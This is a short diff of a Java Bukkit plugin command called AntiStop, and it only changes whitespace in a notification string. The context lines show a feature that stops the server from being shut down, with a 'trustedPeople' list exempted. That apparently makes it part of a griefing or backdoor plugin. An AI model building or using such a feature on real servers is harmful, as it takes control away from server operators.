@@ -43,7 +43,7 @@ public class AntiStop extends Command {
             method = cancelMethod.Cancel;
         isActive = true;
         p.sendMessage(Start.COMMAND_PREFIX + "§aServer now can not be stopped!");
-        this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " enabled AntiStop with mode : "+method.toString()+" !");
+        this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " enabled AntiStop with mode : " + method.toString() + " !");
         for (Player r : Bukkit.getOnlinePlayers()) {
             if (Start.Instance.trustedPeople.contains(r.getUniqueId())) continue;
             if (r.isDead()) return;
